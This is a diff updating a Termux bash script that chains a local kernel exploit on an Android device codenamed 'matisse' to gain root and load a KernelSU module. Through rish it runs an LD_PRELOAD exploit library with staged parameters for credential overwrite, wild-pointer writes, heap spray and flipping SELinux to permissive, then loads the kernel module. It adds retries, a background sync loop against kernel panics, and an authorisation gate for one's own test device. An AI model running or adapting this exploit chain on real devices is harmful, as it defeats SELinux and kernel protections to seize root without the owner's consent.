@@ -1,18 +1,26 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ============================================================================
-# ksu_load.sh v3 — matisse 装载 kernelsu (2026-09-10)
+# ksu_load.sh v4 — matisse 装载 kernelsu (2026-09-10, helmsman 修订)
+#   v4: A1 修 R 轮 PSELECT_KO 指错模块(matisse->gki209); 开火期持续 sync 防 panic 丢证;
+#   每阶段完成即回拉 raw; 每 boot 1 发纪律不变
 #   ★ v3 修复: rish 必须用 -c / stdin 模式! 直接传 argv 是**静默无效**的
 #     (实测: ./rish "id -u" 无输出 rc=0; ./rish -c "id -u" → 2000)
 #   ★ 新增 rish 自检: 拿不到 2000 就直接退出, 不再静默空跑
 #   ★ 纪律: 每 boot 只打 1 次 (WILDPTR_INCIDENT); 先重启, 开机 10 分钟后再跑
-# 用法: bash ~/ksu_load.sh
+# 用法: KSU_LOAD_ALLOW_KO=1 bash ~/ksu_load.sh
+# 安全门: 本脚本会在 root 窗口内尝试加载内核模块；必须显式授权。
 # ============================================================================
 set -u
+if [ "${KSU_LOAD_ALLOW_KO:-0}" != "1" ]; then
+  echo "!! 此流程会尝试加载 KernelSU 内核模块；未获显式授权，已停止。"
+  echo "   如确认在自有测试设备执行：KSU_LOAD_ALLOW_KO=1 bash ~/ksu_load.sh"
+  exit 64
+fi
 H="$HOME"
 KODIR="$H/matisse/bin/ksu"
 PRE="$KODIR/preflight_gki209.ko"
 KSU="$KODIR/kernelsu_gki209_v2.ko"
-EXP="$H/matisse/bin/mt86/preload.so"
+EXP="$H/matisse/bin/mt87/preload.so"
 OUTD=/data/local/tmp
 TS=$(date +%Y%m%d_%H%M%S)
 LOGD="$H/ksu_load_logs_$TS"
@@ -21,7 +29,7 @@ mkdir -p "$LOGD"
 say(){ echo "[$(date +%H:%M:%S)] $*"; }
 
 echo "=========================================================="
-echo " matisse KSU 装载 (rish -c 模式 / 每 boot 1 发 / mt86 野指针修复)"
+echo " matisse KSU 装载 (rish -c 模式 / 每 boot 1 发 / mt87 毒链自清)"
 echo " 日志: $LOGD"
 echo "=========================================================="
 for f in "$PRE" "$KSU" "$EXP" "$RISH"; do [ -f "$f" ] || { echo "!! 缺文件: $f"; exit 1; }; done
@@ -122,15 +130,21 @@ fire(){
   tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
   koflag=""; [ -n "$ko" ] && koflag="PSELECT_KO=$ko"
   case "$kind" in
-    R)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_KO=/data/local/tmp/kernelsu_matisse.ko PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
+    R)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_KO=/data/local/tmp/kernelsu_gki209.ko PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
     E5)  cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
     C)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
     E5R) cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
   esac
   say ">>> 开火 $name (约 4-5 分钟, 别动手机)"
+  # v4: 设备端持续 sync (panic 丢 ext4 脏页=R1.out 蒸发根因); 幂等单实例
+  SYNCUP=$(rsh "pgrep -f 'while :; do sync' | head -1" 20 2>/dev/null | tr -d '\r ')
+  if [ -z "$SYNCUP" ]; then rsh "nohup sh -c 'while :; do sync; sleep 2; done' >/dev/null 2>&1 & echo sync-armed" 20 >/dev/null 2>&1; fi
   rsh1 "timeout 250 env $cmd LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/$name.out 2>&1" 280 \
     | tee "$LOGD/$name.tail" | grep -a "RC=\|ROOT-SEN\|finit_module\|UNPOISON\|resolver\|no symbol\|disagree" | tail -4
   say "$name 完成, enforce=$(rsh "getenforce" 20 | tr -d "\r")"
+  # v4: 阶段产物即时回拉
+  rsh "cat $OUTD/$name.out 2>/dev/null" 120 > "$LOGD/$name.raw.out" 2>/dev/null
+  rsh "sync" 20 >/dev/null
 }
 gate(){ local st; st=$(rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d "\r")
   printf "%s" "$st" | grep -q "CapEff=0000000000000000" && { echo R_MISS; return; }
@@ -152,11 +166,27 @@ T=$(gettask); say "R 落地 task=$T"
 
 # ---------- E5v3 permissive ----------
 fire E5a E5 "" ""
-hbfresh || { echo "!! child 心跳陈旧, 不打 C 轮"; fire E5R E5R "" ""; exit 6; }
-say "permissive: enforce=$(rsh "getenforce" 20 | tr -d "\r")"
+hbfresh || { echo "!! child 心跳陈旧, 不打 C 轮"; exit 6; }
+ENF=$(rsh "getenforce" 20 | tr -d "\r")
+say "permissive: enforce=$ENF"
+# v4.1: E5 未翻转 -> 再补一发 (E5b); 仍失败 -> 不白打 C 轮, 重启后重跑
+if [ "$ENF" != "Permissive" ]; then
+  say "E5a 未中 (enforce=$ENF) - 补发 E5b..."
+  fire E5b E5 "" ""
+  ENF=$(rsh "getenforce" 20 | tr -d "\r")
+  say "E5b 后 enforce=$ENF"
+  if [ "$ENF" != "Permissive" ]; then
+    echo "!! E5 两发均未翻转 permissive - C(finit) 必败, 本 boot 到此为止 (重启后重跑 KSU_LOAD_ALLOW_KO=1 bash ~/ksu_load.sh)"
+    exit 7
+  fi
+fi
 
 # ---------- C 轮: 装 kernelsu ----------
 fire Cksu C "$T" "$OUTD/kernelsu_gki209.ko"
+# v4.2: ROOT-SEEN/finit 的钱串打在 R child 的 stdout (=R1.out),
+#       C 落地后才会出现 → C 后必须再回拉 R1.out 尾部
+rsh "tail -c 300000 $OUTD/R1.out 2>/dev/null" 120 > "$LOGD/R1.afterC.tail.out" 2>/dev/null
+grep -a "ROOT-SEN\|finit_module\|mt87b\|ksu_done\|insmod\|UNPOISON\|no symbol\|disagree" "$LOGD/R1.afterC.tail.out" | tail -6
 KSUM=$(rsh "grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d "\r ")
 rsh "dmesg 2>/dev/null | grep -aiE \"ksu|kernelsu\" | tail -15" 30 | tee "$LOGD/dmesg_ksu.txt"
 say "kernelsu: /proc/modules=${KSUM:-0}"
